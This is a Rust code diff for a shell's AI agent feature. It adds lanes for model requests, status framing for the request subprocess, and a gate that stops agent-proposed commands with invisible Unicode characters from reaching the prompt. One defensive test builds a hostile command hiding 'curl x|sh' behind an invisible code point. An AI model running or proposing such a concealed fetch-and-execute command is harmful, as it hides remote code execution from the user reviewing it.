@@ -91,7 +91,60 @@ const MODEL_REQUEST_DEADLINE: std::time::Duration = std::time::Duration::from_se
 /// blocking on a full pipe.
 const MODEL_CHILD_OK: u8 = b'+';
 const MODEL_CHILD_ERR: u8 = b'-';
+/// An OK payload starts with the provider's HTTP status as exactly this many
+/// ASCII digits. HTTP status codes are three digits by construction, and the
+/// parent needs the status to apply its lane's own precedence rules -- the
+/// editor lane reports the provider's error member in preference to the code,
+/// which it cannot do if the child has already collapsed the response.
+const MODEL_CHILD_STATUS_DIGITS: usize = 3;
+/// Marker byte plus status digits: everything on stdout that is not the body.
+const MODEL_CHILD_FRAMING_BYTES: usize = 1 + MODEL_CHILD_STATUS_DIGITS;
 const MAX_MODEL_CHILD_STDERR_BYTES: usize = 8 * 1024;
+
+/// Which caller a model request belongs to.
+///
+/// Both lanes run through the same one-shot child — that is the whole point,
+/// so TLS verification, the redirect policy and the proxy rule exist once —
+/// but they do not share their budgets. The Agent waits minutes for a reply
+/// that may be a megabyte; the editor lane waits 30 s, caps response headers,
+/// and hands the body back whatever the status was.
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+pub(crate) enum ModelRequestLane {
+    Agent,
+    Chat,
+}
+
+impl ModelRequestLane {
+    fn as_wire_value(self) -> &'static str {
+        match self {
+            Self::Agent => "agent",
+            Self::Chat => "chat",
+        }
+    }
+
+    fn from_wire_value(value: &str) -> Option<Self> {
+        match value {
+            "agent" => Some(Self::Agent),
+            "chat" => Some(Self::Chat),
+            _ => None,
+        }
+    }
+
+    /// Ceiling on the decoded provider response this lane accepts.
+    fn response_limit(self) -> u64 {
+        match self {
+            Self::Agent => MAX_AGENT_RESPONSE_BYTES,
+            Self::Chat => crate::ai::MAX_AI_RESPONSE_BODY_BYTES,
+        }
+    }
+}
+
+/// One provider response exactly as the transport child observed it.
+#[derive(Debug)]
+pub(crate) struct ModelHttpReply {
+    pub status: u16,
+    pub body: Vec<u8>,
+}
 
 /// The one-shot child now carries jagent's public typed result end to end.
 /// Keeping a local name documents the process boundary without maintaining a
@@ -1079,12 +1132,42 @@ fn review_proposal(
                     }
                 }
             }
-            "i" | "insert" => match session.edit_for_manual_review(id, command) {
-                Ok(command) => return ReviewOutcome::Insert(command),
-                Err(error) => {
-                    eprintln!("  agent: {error}");
+            "i" | "insert" => {
+                // `[i]` is the weakest-review branch and therefore needs jsh's
+                // own exact-review check, not jagent's. The card above printed
+                // every ambiguous code point as a visible `\u{...}` escape, but
+                // this branch hands the *raw* string to the next prompt, where
+                // the line editor renders it as ordinary typed input and a
+                // single Enter executes it -- no `confirm_danger` RUN gate as
+                // in `[y]`, no second `is_safe_inline` pass as in `[e]`.
+                // jagent's `validate_command` does not close that gap. Its
+                // invisible-character table is deliberately a subset of this
+                // one — it stops at U+FFF8 and keeps the assigned interlinear
+                // annotation anchors U+FFF9..=U+FFFB, which Unicode does not
+                // class as default-ignorable but a terminal still renders as
+                // nothing. So a proposal can pass jagent, be displayed here as
+                // a `\u{fff9}` escape, and then reach the prompt spelled as
+                // nothing at all. jsh renders against `is_terminal_ambiguous`,
+                // so that is the set the insert boundary has to enforce.
+                // Refuse before `edit_for_manual_review` so the session is not
+                // moved to ManualReview for a command jsh will not insert; the
+                // call returns its argument unchanged, so checking it here is
+                // checking the exact bytes that would have been inserted.
+                if !may_insert_for_manual_review(command) {
+                    eprintln!(
+                        "  agent: this command contains invisible, bidirectional, or \
+                         terminal-control characters, so the prompt would not show what \
+                         Enter would run; use [e] to retype it"
+                    );
+                    continue;
                 }
-            },
+                match session.edit_for_manual_review(id, command) {
+                    Ok(command) => return ReviewOutcome::Insert(command),
+                    Err(error) => {
+                        eprintln!("  agent: {error}");
+                    }
+                }
+            }
             "n" | "no" | "reject" => {
                 if let Err(error) = session.reject(id) {
                     eprintln!("agent: {error}");
@@ -1099,6 +1182,16 @@ fn review_proposal(
             _ => {}
         }
     }
+}
+
+/// Whether a proposal may be moved to the next prompt for manual review.
+///
+/// The prompt is not a review surface: it renders its buffer as ordinary typed
+/// input, so a code point the review card had to spell as `\u{...}` shows up
+/// there as nothing at all, and Enter runs it. Insert-only review is therefore
+/// allowed only for text whose displayed and executed spellings are identical.
+fn may_insert_for_manual_review(command: &str) -> bool {
+    crate::terminal_text::is_safe_inline(command)
 }
 
 /// Recognized-dangerous commands need a second, deliberate confirmation after
@@ -1150,9 +1243,13 @@ fn request_model(
         role: Role::User,
         text: user_text,
     }];
-    let prepared = prepare_agent_request(chat, AgentRequestSpec::new(&history, protocol))
+    let mut prepared = prepare_agent_request(chat, AgentRequestSpec::new(&history, protocol))
         .map_err(|error| error.to_string())?;
     debug_assert!(prepared.report.redaction_enabled);
+    // The Agent lane builds its body through the same jagent code the chat
+    // lane does, so it inherits the same `preserve_order` member order and
+    // needs the same canonical re-encoding. See `crate::wire_json`.
+    prepared.request.body = crate::wire_json::canonical_request_body(&prepared.request.body)?;
     let raw = model_request(prepared.request.clone(), chat.provider)?;
     prepared
         .parse_response(&raw)
@@ -1172,6 +1269,10 @@ fn request_model(
 /// process group ends the request now, which is why there is no in-flight gate
 /// here any more: there is never a previous request left to wait for.
 ///
+/// Both AI lanes come through here. The Agent builtin passes a pending-signal
+/// predicate; the editor worker passes its own [`crate::ai::AiCancellation`],
+/// because in raw mode Ctrl-C is a key event and never becomes a signal at all.
+///
 /// The child is this same binary. That matters: TLS verification, the redirect
 /// policy, the response header caps and the body ceiling are all the code in
 /// [`perform_model_request`], unchanged and unduplicated. Only *where* it runs
@@ -1179,8 +1280,13 @@ fn request_model(
 ///
 /// The envelope travels on stdin rather than argv because it carries the API
 /// key, and argv is world-readable through `/proc`.
-fn model_request(request: HttpRequest, provider: Provider) -> Result<Vec<u8>, String> {
-    if crate::signal::pending_status().is_some() {
+pub(crate) fn model_http_request(
+    request: HttpRequest,
+    provider: Provider,
+    lane: ModelRequestLane,
+    cancel: &(dyn Fn() -> bool + Sync),
+) -> Result<ModelHttpReply, String> {
+    if cancel() {
         return Err("interrupted".to_string());
     }
     // `HttpRequest` is intentionally public and cloneable. Validate again at
@@ -1189,7 +1295,7 @@ fn model_request(request: HttpRequest, provider: Provider) -> Result<Vec<u8>, St
     request
         .validate_transport()
         .map_err(|error| format!("invalid model request: {error}"))?;
-    let envelope = encode_model_request(&request, provider);
+    let envelope = encode_model_request(&request, provider, lane);
     if envelope.len() > MAX_MODEL_REQUEST_ENVELOPE_BYTES {
         return Err("model request is too large to send".to_string());
     }
@@ -1199,16 +1305,15 @@ fn model_request(request: HttpRequest, provider: Provider) -> Result<Vec<u8>, St
     let mut command = std::process::Command::new(executable);
     command.arg(INTERNAL_MODEL_REQUEST_FLAG);
 
-    let cancelled = || crate::signal::pending_status().is_some();
     let output = crate::io_guard::bounded_command_session(
         &mut command,
         crate::io_guard::BoundedCommand {
-            // One status byte of framing on top of the transport's own ceiling.
-            stdout_limit: MAX_AGENT_RESPONSE_BYTES as usize + 1,
+            // Framing on top of this lane's own response ceiling.
+            stdout_limit: MODEL_CHILD_FRAMING_BYTES.saturating_add(lane.response_limit() as usize),
             stderr_limit: MAX_MODEL_CHILD_STDERR_BYTES,
             timeout: MODEL_REQUEST_DEADLINE,
             stdin: Some(envelope.as_bytes()),
-            cancel: Some(&cancelled),
+            cancel: Some(cancel),
             // A shell that is killed outright must not leave a request running
             // against the provider with nobody to read the answer.
             die_with_parent: true,
@@ -1227,8 +1332,25 @@ fn model_request(request: HttpRequest, provider: Provider) -> Result<Vec<u8>, St
         Err(error) => return Err(format!("could not run the model request: {error}")),
     };
 
-    match output.stdout.split_first() {
-        Some((&MODEL_CHILD_OK, body)) => Ok(body.to_vec()),
+    decode_model_child_reply(&output.stdout)
+}
+
+/// Split the child's stdout into the provider status and the untouched body.
+fn decode_model_child_reply(stdout: &[u8]) -> Result<ModelHttpReply, String> {
+    match stdout.split_first() {
+        Some((&MODEL_CHILD_OK, rest)) if rest.len() >= MODEL_CHILD_STATUS_DIGITS => {
+            let (status, body) = rest.split_at(MODEL_CHILD_STATUS_DIGITS);
+            let status = std::str::from_utf8(status)
+                .ok()
+                .and_then(|digits| digits.parse::<u16>().ok())
+                // A truncated or non-numeric status means the framing is not
+                // this jsh's. Treat it exactly like a missing marker.
+                .ok_or_else(|| "the model request did not complete".to_string())?;
+            Ok(ModelHttpReply {
+                status,
+                body: body.to_vec(),
+            })
+        }
         Some((&MODEL_CHILD_ERR, message)) => Err(String::from_utf8_lossy(message).into_owned()),
         // No framing byte at all means the child died before it could answer —
         // a signal, or a binary that is not this jsh. Its stderr is untrusted
@@ -1237,12 +1359,30 @@ fn model_request(request: HttpRequest, provider: Provider) -> Result<Vec<u8>, St
     }
 }
 
+/// The Agent lane's view of [`model_http_request`]: a non-2xx response is an
+/// error and its body is discarded unseen.
+fn model_request(request: HttpRequest, provider: Provider) -> Result<Vec<u8>, String> {
+    let cancelled = || crate::signal::pending_status().is_some();
+    let reply = model_http_request(request, provider, ModelRequestLane::Agent, &cancelled)?;
+    if !(200..300).contains(&reply.status) {
+        // The response body is untrusted terminal data. Provider diagnostics
+        // are deliberately not echoed before protocol validation.
+        return Err(format!("HTTP {}", reply.status));
+    }
+    Ok(reply.body)
+}
+
 /// Serialize a request for the child. Deliberately jsh's own small envelope
 /// rather than serde on jagent's types: the wire format is private to this pair
 /// of processes, and it should not move when a dependency adds a field.
-fn encode_model_request(request: &HttpRequest, provider: Provider) -> String {
+fn encode_model_request(
+    request: &HttpRequest,
+    provider: Provider,
+    lane: ModelRequestLane,
+) -> String {
     serde_json::json!({
-        "v": 1,
+        "v": 2,
+        "lane": lane.as_wire_value(),
         "provider": provider.as_config_value(),
         "url": request.url,
         "headers": request.headers,
@@ -1260,19 +1400,22 @@ fn encode_model_request(request: &HttpRequest, provider: Provider) -> String {
 #[serde(deny_unknown_fields)]
 struct ModelRequestEnvelope {
     v: u64,
+    lane: String,
     provider: String,
     url: String,
     headers: Vec<(String, String)>,
     body: String,
 }
 
-fn decode_model_request(envelope: &str) -> Result<(HttpRequest, Provider), String> {
+fn decode_model_request(
+    envelope: &str,
+) -> Result<(HttpRequest, Provider, ModelRequestLane), String> {
     // Do not reflect serde diagnostics: an unknown field or variant name is
     // controlled by the caller, while the child protocol only needs a stable
     // bounded classification.
     let envelope: ModelRequestEnvelope =
         serde_json::from_str(envelope).map_err(|_| "malformed request".to_string())?;
-    if envelope.v != 1 {
+    if envelope.v != 2 {
         return Err("unsupported request version".to_string());
     }
     let provider = match envelope.provider.as_str() {
@@ -1284,6 +1427,12 @@ fn decode_model_request(envelope: &str) -> Result<(HttpRequest, Provider), Strin
         // supplied.
         _ => return Err("unknown provider".to_string()),
     };
+    // The lane selects this child's timeouts and response caps, so an
+    // unrecognized one is refused rather than defaulted to the more permissive
+    // of the two.
+    let Some(lane) = ModelRequestLane::from_wire_value(&envelope.lane) else {
+        return Err("unknown request lane".to_string());
+    };
     Ok((
         HttpRequest {
             url: envelope.url,
@@ -1291,6 +1440,7 @@ fn decode_model_request(envelope: &str) -> Result<(HttpRequest, Provider), Strin
             body: envelope.body,
         },
         provider,
+        lane,
     ))
 }
 
@@ -1307,13 +1457,17 @@ pub(crate) fn run_internal_model_request(args: &[std::ffi::OsString]) -> Option<
         eprintln!("jsh: internal model request received unexpected arguments");
         return Some(2);
     }
-    let answer = |marker: u8, payload: &str| {
+    // Framing, both directions: `-` plus a diagnostic, or `+` plus the
+    // provider's three-digit status and then its bytes verbatim.
+    let write_reply = |marker: u8, header: &[u8], payload: &[u8]| {
         use std::io::Write;
         let mut stdout = std::io::stdout().lock();
         let _ = stdout.write_all(&[marker]);
-        let _ = stdout.write_all(payload.as_bytes());
+        let _ = stdout.write_all(header);
+        let _ = stdout.write_all(payload);
         let _ = stdout.flush();
     };
+    let fail = |message: &str| write_reply(MODEL_CHILD_ERR, &[], message.as_bytes());
 
     let envelope = match crate::io_guard::read_to_end_bounded(
         std::io::stdin().lock(),
@@ -1321,72 +1475,106 @@ pub(crate) fn run_internal_model_request(args: &[std::ffi::OsString]) -> Option<
     ) {
         Ok(bytes) => bytes,
         Err(error) => {
-            answer(MODEL_CHILD_ERR, &format!("could not read request: {error}"));
+            fail(&format!("could not read request: {error}"));
             return Some(1);
         }
     };
     let envelope = match String::from_utf8(envelope) {
         Ok(text) => text,
         Err(_) => {
-            answer(MODEL_CHILD_ERR, "request was not valid UTF-8");
+            fail("request was not valid UTF-8");
             return Some(1);
         }
     };
     match decode_model_request(&envelope) {
-        Ok((request, provider)) => match perform_model_request(request, provider) {
-            Ok(reply) => {
-                answer(MODEL_CHILD_OK, &reply);
+        // The provider is decoded, and an unknown one refused, even though the
+        // transport itself no longer branches on it: the envelope stays a
+        // strict schema, and the parent's decoder is chosen by the same value.
+        Ok((request, _provider, lane)) => match perform_model_request(request, lane) {
+            Ok((status, body)) => {
+                write_reply(
+                    MODEL_CHILD_OK,
+                    encode_model_child_status(status).as_bytes(),
+                    &body,
+                );
                 Some(0)
             }
             Err(error) => {
-                answer(MODEL_CHILD_ERR, &error);
+                fail(&error);
                 Some(1)
             }
         },
         Err(error) => {
-            answer(MODEL_CHILD_ERR, &error);
+            fail(&error);
             Some(1)
         }
     }
 }
 
-fn perform_model_request(request: HttpRequest, _provider: Provider) -> Result<String, String> {
+/// Render an HTTP status as the fixed-width field the reply framing expects.
+///
+/// `ureq`'s status type only ever holds 100..=999, so the clamp never fires in
+/// practice; it exists so that a future transport with a wider type cannot
+/// silently shift the body by one byte.
+fn encode_model_child_status(status: u16) -> String {
+    format!("{:03}", status.clamp(100, 999))
+}
+
+/// Perform the request for one lane and hand the parent the status and the
+/// untouched body.
+///
+/// Status interpretation deliberately stays in the parent. The Agent lane
+/// discards a non-2xx body unseen; the editor lane reports the provider's own
+/// error member in preference to the bare code, which it can only do if these
+/// bytes survive the process boundary.
+pub(crate) fn perform_model_request(
+    request: HttpRequest,
+    lane: ModelRequestLane,
+) -> Result<(u16, Vec<u8>), String> {
     // The hidden child is an independently invokable process boundary. Its
     // stdin is untrusted even though the ordinary parent creates it, so the
     // decoded public request must pass jagent's complete transport contract
     // immediately before any HTTP client or resolver sees it.
     let bypass_environment_proxy = crate::ai::request_must_bypass_proxy(&request)
         .map_err(|error| format!("invalid model request: {error}"))?;
-    let agent = agent_http_client(bypass_environment_proxy);
+    let agent = match lane {
+        ModelRequestLane::Agent => agent_http_client(bypass_environment_proxy),
+        ModelRequestLane::Chat => crate::ai::ai_agent(bypass_environment_proxy),
+    };
     let mut post = agent.post(&request.url);
     for (name, value) in &request.headers {
         post = post.header(name, value);
     }
     let mut response = post
         .send(request.body.as_str())
-        .map_err(|error| error.to_string())?;
-    let status = response.status();
+        .map_err(|error| match lane {
+            ModelRequestLane::Agent => error.to_string(),
+            ModelRequestLane::Chat => format!("Request failed: {error}"),
+        })?;
+    let status = response.status().as_u16();
+    if lane == ModelRequestLane::Chat {
+        // Headers are parsed and retained before any body limit applies, so
+        // the editor lane bounds them in their own right.
+        crate::ai::response_headers_within_limits(response.headers())?;
+    }
     // ureq applies this configured limit to wire bytes below its content
     // decoder. Preserve that bound, then cap the decoded reader separately so
     // a small transparently decoded response (currently gzip) cannot expand
-    // into an unbounded String in this independently invokable child.
+    // into an unbounded allocation in this independently invokable child.
     let decoded = response
         .body_mut()
         .with_config()
-        .limit(MAX_AGENT_RESPONSE_BYTES)
+        .limit(lane.response_limit())
         .reader();
-    let text = read_model_response_bounded(decoded)?;
-    if !status.is_success() {
-        // The response body is untrusted terminal data. Provider diagnostics
-        // are deliberately not echoed before protocol validation.
-        return Err(format!("HTTP {}", status.as_u16()));
-    }
-    // Keep the provider body intact. The parent still owns the
-    // PreparedAgentRequest that created this request and parses these bytes
-    // through its bound provider/protocol decoder before session ingestion.
-    // Parsing in this transport child used to erase completion metadata and
-    // made native-tool replies impossible to carry back safely.
-    Ok(text)
+    // Keep the provider body intact. The parent still owns the decoder that
+    // these bytes belong to — the Agent lane's PreparedAgentRequest, or the
+    // editor lane's canonical duplicate-member-rejecting entry point — and
+    // parsing here used to erase completion metadata.
+    let body = match lane {
+        ModelRequestLane::Agent => read_model_response_bounded(decoded)?.into_bytes(),
+        ModelRequestLane::Chat => crate::ai::read_response_body_bounded(decoded)?,
+    };
+    Ok((status, body))
 }
 
 fn read_model_response_bounded(reader: impl Read) -> Result<String, String> {
@@ -2400,7 +2588,11 @@ mod tests {
         MAX_AGENT_COMMAND_DISPLAY_BYTES, MAX_AGENT_DISPLAY_BYTES, MAX_AGENT_RESPONSE_BYTES,
         MAX_AGENT_SESSION_TURNS,
     };
-    use super::{decode_model_request, encode_model_request};
+    use super::{
+        decode_model_child_reply, decode_model_request, encode_model_child_status,
+        encode_model_request, may_insert_for_manual_review, model_http_request, ModelRequestLane,
+        MODEL_CHILD_ERR, MODEL_CHILD_OK,
+    };
     use crate::environment::ShellState;
     use jagent::provider::{ChatConfig, HttpRequest, Message, Provider, Role};
     use jagent::{
@@ -2522,10 +2714,16 @@ mod tests {
             Provider::OpenAiCompatible,
             Provider::Ollama,
         ] {
-            let encoded = encode_model_request(&request, provider);
-            let (decoded, decoded_provider) = decode_model_request(&encoded).expect("round trip");
-            assert_eq!(decoded, request);
-            assert_eq!(decoded_provider, provider);
+            // The lane selects the child's timeouts and response caps, so it
+            // has to survive the envelope as exactly as the credential does.
+            for lane in [ModelRequestLane::Agent, ModelRequestLane::Chat] {
+                let encoded = encode_model_request(&request, provider, lane);
+                let (decoded, decoded_provider, decoded_lane) =
+                    decode_model_request(&encoded).expect("round trip");
+                assert_eq!(decoded, request);
+                assert_eq!(decoded_provider, provider);
+                assert_eq!(decoded_lane, lane);
+            }
         }
     }
 
@@ -2551,20 +2749,27 @@ mod tests {
         for envelope in [
             "",
             "not json",
+            r#"{"v":1,"lane":"agent","provider":"ollama","url":"http://x","headers":[],"body":"{}"}"#,
+            r#"{"v":3,"lane":"agent","provider":"ollama","url":"http://x","headers":[],"body":"{}"}"#,
+            // No lane, and no defaulting to one: the lane chooses this child's
+            // timeouts and response ceiling.
             r#"{"v":2,"provider":"ollama","url":"http://x","headers":[],"body":"{}"}"#,
-            r#"{"v":1,"provider":"unknown","url":"http://x","headers":[],"body":"{}"}"#,
-            r#"{"v":1,"provider":"ollama","headers":[],"body":"{}"}"#,
-            r#"{"v":1,"provider":"ollama","url":"http://x","body":"{}"}"#,
-            r#"{"v":1,"provider":"ollama","url":"http://x","headers":[],"body":1}"#,
-            r#"{"v":1,"provider":"ollama","url":"http://x","headers":[["only-one"]],"body":"{}"}"#,
-            r#"{"v":1,"provider":"ollama","url":"http://x","headers":[[1,2]],"body":"{}"}"#,
-            r#"{"v":1,"v":1,"provider":"ollama","url":"http://x","headers":[],"body":"{}"}"#,
-            r#"{"v":1,"provider":"ollama","provider":"ollama","url":"http://x","headers":[],"body":"{}"}"#,
-            r#"{"v":1,"provider":"ollama","url":"http://x","url":"http://x","headers":[],"body":"{}"}"#,
-            r#"{"v":1,"provider":"ollama","url":"http://x","headers":[],"headers":[],"body":"{}"}"#,
-            r#"{"v":1,"provider":"ollama","url":"http://x","headers":[],"body":"{}","body":"{}"}"#,
-            r#"{"v":1,"provider":"ollama","url":"http://x","headers":[],"body":"{}","future":true}"#,
-            r#"{"v":1,"provider":"ollama","url":"http://x","headers":[],"body":"{}"} trailing"#,
+            r#"{"v":2,"lane":"","provider":"ollama","url":"http://x","headers":[],"body":"{}"}"#,
+            r#"{"v":2,"lane":"editor","provider":"ollama","url":"http://x","headers":[],"body":"{}"}"#,
+            r#"{"v":2,"lane":"agent","lane":"chat","provider":"ollama","url":"http://x","headers":[],"body":"{}"}"#,
+            r#"{"v":2,"lane":"agent","provider":"unknown","url":"http://x","headers":[],"body":"{}"}"#,
+            r#"{"v":2,"lane":"agent","provider":"ollama","headers":[],"body":"{}"}"#,
+            r#"{"v":2,"lane":"agent","provider":"ollama","url":"http://x","body":"{}"}"#,
+            r#"{"v":2,"lane":"agent","provider":"ollama","url":"http://x","headers":[],"body":1}"#,
+            r#"{"v":2,"lane":"agent","provider":"ollama","url":"http://x","headers":[["only-one"]],"body":"{}"}"#,
+            r#"{"v":2,"lane":"agent","provider":"ollama","url":"http://x","headers":[[1,2]],"body":"{}"}"#,
+            r#"{"v":2,"v":2,"lane":"agent","provider":"ollama","url":"http://x","headers":[],"body":"{}"}"#,
+            r#"{"v":2,"lane":"agent","provider":"ollama","provider":"ollama","url":"http://x","headers":[],"body":"{}"}"#,
+            r#"{"v":2,"lane":"agent","provider":"ollama","url":"http://x","url":"http://x","headers":[],"body":"{}"}"#,
+            r#"{"v":2,"lane":"agent","provider":"ollama","url":"http://x","headers":[],"headers":[],"body":"{}"}"#,
+            r#"{"v":2,"lane":"agent","provider":"ollama","url":"http://x","headers":[],"body":"{}","body":"{}"}"#,
+            r#"{"v":2,"lane":"agent","provider":"ollama","url":"http://x","headers":[],"body":"{}","future":true}"#,
+            r#"{"v":2,"lane":"agent","provider":"ollama","url":"http://x","headers":[],"body":"{}"} trailing"#,
         ] {
             assert!(
                 decode_model_request(envelope).is_err(),
@@ -3506,5 +3711,175 @@ mod tests {
         let mut session = AgentSession::new(4);
         session.submit_user("inspect").unwrap();
         assert!(session.accept_agent_response(&response).is_err());
+    }
+
+    /// Drive a session to exactly one pending proposal carrying `command`.
+    fn session_with_proposal(command: &str) -> (AgentSession, jagent::ProposalId, String) {
+        let history = [Message {
+            role: Role::User,
+            text: "inspect".into(),
+        }];
+        let config = ChatConfig {
+            provider: Provider::OpenAiCompatible,
+            api_key: None,
+            model: "test-model".into(),
+            base_url: Provider::OpenAiCompatible.default_base_url().into(),
+            max_tokens: 128,
+            temperature: Some(0.0),
+        };
+        let prepared = prepare_request(
+            &config,
+            RequestSpec::new(&history, AgentProtocol::NativeTools),
+        )
+        .unwrap();
+        let arguments = serde_json::json!({ "command": command }).to_string();
+        let body = serde_json::json!({
+            "choices": [{
+                "message": {
+                    "content": serde_json::Value::Null,
+                    "tool_calls": [{
+                        "id": "call_1",
+                        "type": "function",
+                        "function": { "name": "run", "arguments": arguments },
+                    }],
+                },
+                "finish_reason": "tool_calls",
+            }]
+        })
+        .to_string();
+        let response = prepared.parse_response(body.as_bytes()).unwrap();
+        let mut session = AgentSession::new(4);
+        session.submit_user("inspect").unwrap();
+        let ModelOutcome::Proposal {
+            id,
+            command: proposed,
+            ..
+        } = session.accept_agent_response(&response).unwrap()
+        else {
+            panic!("no proposal")
+        };
+        (session, id, proposed)
+    }
+
+    /// `[i] insert` is the weakest review branch: unlike `[y]` it never reaches
+    /// `confirm_danger`, and unlike `[e]` the text is not retyped by the user.
+    /// jagent's validation is not a substitute for jsh's — its invisible
+    /// character table is strictly narrower — so the gate that keeps a hidden
+    /// code point off the prompt line has to be jsh's own.
+    #[test]
+    fn insert_only_review_refuses_what_jagent_alone_accepts() {
+        // U+FFF9..=U+FFFB, the interlinear annotation anchor/separator/
+        // terminator: assigned, so jagent's table deliberately stops just
+        // below them, and invisible, so the review card escapes them and the
+        // prompt line would not.
+        for hidden in ['\u{fff9}', '\u{fffa}', '\u{fffb}'] {
+            let command = format!("git log --oneline{hidden} && curl x|sh");
+            let (mut session, id, proposed) = session_with_proposal(&command);
+            assert_eq!(proposed, command, "jagent rewrote the command");
+
+            // jsh refuses it, and refuses it *before* the session moves, so the
+            // proposal is still reviewable through [e], [n] or [q].
+            assert!(
+                !may_insert_for_manual_review(&command),
+                "U+{:04X} would reach the prompt line",
+                u32::from(hidden)
+            );
+
+            // And this is the part jagent alone would have let through: it
+            // accepts the very same string for manual review.
+            let accepted = session
+                .edit_for_manual_review(id, command.clone())
+                .expect("jagent accepts this command");
+            assert_eq!(accepted, command);
+        }
+    }
+
+    /// The safe case still goes through, unchanged: the gate rejects only what
+    /// the review card had to escape.
+    #[test]
+    fn insert_only_review_still_accepts_an_ordinary_command() {
+        for command in ["git log --oneline", "printf '雪'", "ls -la /tmp"] {
+            assert!(may_insert_for_manual_review(command), "{command}");
+            let (mut session, id, _) = session_with_proposal(command);
+            assert_eq!(
+                session.edit_for_manual_review(id, command).unwrap(),
+                command
+            );
+        }
+    }
+
+    /// Cancellation must be checked before anything is spawned: a request the
+    /// caller has already given up on should cost no process and no connection.
+    #[test]
+    fn an_already_cancelled_model_request_never_reaches_a_child() {
+        let request = HttpRequest {
+            url: "https://api.example.test/v1/messages".to_string(),
+            headers: vec![("content-type".to_string(), "application/json".to_string())],
+            body: r#"{"model":"m","messages":[]}"#.to_string(),
+        };
+        let cancelled = || true;
+        for lane in [ModelRequestLane::Agent, ModelRequestLane::Chat] {
+            let error = model_http_request(request.clone(), Provider::Anthropic, lane, &cancelled)
+                .expect_err("a cancelled request must not be made");
+            assert_eq!(error, "interrupted", "{lane:?}");
+        }
+    }
+
+    /// The child's reply framing carries the provider's status alongside the
+    /// body, because each lane applies its own status precedence in the parent.
+    #[test]
+    fn the_child_reply_carries_the_status_and_the_untouched_body() {
+        let mut ok = vec![MODEL_CHILD_OK];
+        ok.extend_from_slice(b"429");
+        ok.extend_from_slice(br#"{"error":{"message":"slow down"}}"#);
+        let reply = decode_model_child_reply(&ok).expect("framed reply");
+        assert_eq!(reply.status, 429);
+        assert_eq!(reply.body, br#"{"error":{"message":"slow down"}}"#);
+
+        // A 200 with an empty body is still a well-formed reply.
+        let mut empty = vec![MODEL_CHILD_OK];
+        empty.extend_from_slice(b"200");
+        let reply = decode_model_child_reply(&empty).expect("framed reply");
+        assert_eq!(reply.status, 200);
+        assert!(reply.body.is_empty());
+
+        let mut failed = vec![MODEL_CHILD_ERR];
+        failed.extend_from_slice(b"Request failed: refused");
+        assert_eq!(
+            decode_model_child_reply(&failed).unwrap_err(),
+            "Request failed: refused"
+        );
+    }
+
+    /// Framing this process did not write is never guessed at: a short or
+    /// non-numeric status would silently shift the body.
+    #[test]
+    fn a_truncated_or_unframed_child_reply_is_refused() {
+        let mut short = vec![MODEL_CHILD_OK];
+        short.extend_from_slice(b"20");
+        let mut letters = vec![MODEL_CHILD_OK];
+        letters.extend_from_slice(b"okk{}");
+        for stdout in [
+            Vec::new(),
+            vec![MODEL_CHILD_OK],
+            short,
+            letters,
+            b"200{}".to_vec(),
+        ] {
+            assert_eq!(
+                decode_model_child_reply(&stdout).unwrap_err(),
+                "the model request did not complete"
+            );
+        }
+    }
+
+    #[test]
+    fn the_status_field_is_always_three_digits() {
+        assert_eq!(encode_model_child_status(200), "200");
+        assert_eq!(encode_model_child_status(503), "503");
+        // Out-of-range values are clamped rather than allowed to resize the
+        // fixed-width field and shift the body.
+        assert_eq!(encode_model_child_status(0).len(), 3);
+        assert_eq!(encode_model_child_status(u16::MAX).len(), 3);
     }
 }
